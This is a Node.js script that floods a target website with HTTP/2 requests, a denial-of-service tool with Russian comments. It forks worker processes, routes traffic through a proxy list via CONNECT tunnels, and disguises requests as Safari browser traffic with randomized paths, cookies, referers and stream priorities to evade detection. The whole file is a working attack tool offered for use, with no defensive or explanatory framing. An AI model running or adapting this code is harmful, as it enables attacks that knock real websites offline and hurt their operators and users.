const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node parent.js [target] [time] [rate] [thread] [proxy] --path`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
    return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length()));
    }
    return result;
}

// Генерация реалистичных путей
function generateRealisticPath() {
    const commonPaths = [
        '/',
        '/index.html',
        '/home',
        '/about',
        '/contact',
        '/products',
        '/services',
        '/blog',
        '/news',
        '/search',
        '/login',
        '/register',
        '/profile',
        '/cart',
        '/checkout'
    ];
    
    const commonParams = [
        'id', 'page', 'category', 'sort', 'filter', 'search', 
        'lang', 'utm_source', 'utm_medium', 'ref', 'sessionid'
    ];
    
    return randomElement(commonPaths);
}

// Генерация реалистичных query параметров
function generateRealisticQuery() {
    const params = [];
    const numParams = randomIntn(1, 3);
    
    const commonParams = [
        { key: 'page', value: () => randomIntn(1, 100) },
        { key: 'id', value: () => randomIntn(1000, 9999) },
        { key: 'sort', value: () => randomElement(['asc', 'desc', 'popular', 'recent']) },
        { key: 'category', value: () => randomElement(['tech', 'news', 'sports', 'business']) },
        { key: 'lang', value: () => randomElement(['en', 'es', 'fr', 'de', 'ru']) },
        { key: 'utm_source', value: () => randomElement(['google', 'facebook', 'twitter', 'direct']) },
        { key: 'ref', value: () => randomString(8) },
        { key: 'sessionid', value: () => crypto.randomBytes(16).toString('hex') }
    ];
    
    for (let i = 0; i < numParams; i++) {
        const param = randomElement(commonParams);
        params.push(`${param.key}=${param.value()}`);
    }
    
    return params.join('&');
}

// Генерация реалистичных cookies
function generateCookies() {
    const sessionId = crypto.randomBytes(16).toString('hex');
    const timestamp = Date.now();
    
    const cookies = [
        `session_id=${sessionId}`,
        `_ga=GA1.2.${randomIntn(100000000, 999999999)}.${Math.floor(timestamp / 1000)}`,
        `_gid=GA1.2.${randomIntn(100000000, 999999999)}.${Math.floor(timestamp / 1000)}`,
    ];
    
    // Иногда добавляем дополнительные cookies
    if (Math.random() > 0.5) {
        cookies.push(`user_prefs=${randomString(12)}`);
    }
    if (Math.random() > 0.7) {
        cookies.push(`_fbp=fb.1.${timestamp}.${randomIntn(1000000000, 9999999999)}`);
    }
    
    return cookies.join('; ');
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path')
};

var proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);

if (cluster.isPrimary) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
const fetch_site = ["none", "same-origin", "same-site", "cross-site"];

// Более реалистичные языки с весами
const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
];

// Реалистичные referer'ы
const referers = [
    `https://www.google.com/search?q=${randomString(8)}`,
    `https://www.google.com/`,
    `https://www.bing.com/search?q=${randomString(8)}`,
    `https://duckduckgo.com/`,
    `https://www.facebook.com/`,
    `https://twitter.com/`,
    parsedTarget.origin
];

function buildHeaders() {
    let rand_path;
    
    if (args.pathFlag) {
        // Используем реалистичный путь и query
        const basePath = generateRealisticPath();
        const query = generateRealisticQuery();
        rand_path = `${basePath}?${query}`;
    } else {
        // Используем базовый путь или реалистичный
        rand_path = Math.random() > 0.5 ? parsedTarget.pathname : generateRealisticPath();
    }
    
    if (rand_path === '') rand_path = '/';
    
    const userAgent = randomElement(useragents);
    
    // Базовые заголовки в правильном порядке Safari
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":path": rand_path,
        ":authority": parsedTarget.host
    };
    
    headers["sec-fetch-dest"] = "document";
    headers["sec-fetch-mode"] = "navigate";
    headers["sec-fetch-site"] = randomElement(fetch_site);
    
    // Accept с правильным приоритетом
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    headers["user-agent"] = userAgent;
    headers["accept-language"] = randomElement(languages);
    
    // Priority как в Safari
    headers["priority"] = randomElement(["u=0, i", "u=1, i"]);
    
    headers["accept-encoding"] = "gzip, deflate, br";
    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };
    
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        
        connection.setKeepAlive(true, 600000);
        
        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'], // Поддержка обоих протоколов
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA",
            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha384:rsa_pkcs1_sha512",
            ecdhCurve: 'X25519:prime256v1:secp384r1:secp521r1',
            honorCipherOrder: true,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            sessionTimeout: 300
        };
        
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 4096,
                maxConcurrentStreams: 100,
                initialWindowSize: 2097152,
                maxFrameSize: 16384,
                enablePush: false
            },
            createConnection: () => tlsConn
        });
        
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    
                    // Рандомизация parent (100-9999 для несуществующих)
                    const parent = randomIntn(100, 9999);
                    
                    // Exclusive 40% как в реальных браузерах
                    const exclusive = Math.random() > 0.6;
                    
                    const request = client.request(headers, {
                        parent: parent,                
                        exclusive: exclusive
                    });
                    
                    request.on("response", () => {
                        request.close();
                    });
                    request.close();
                }
            }, 1000);
        });
        
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
        
        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);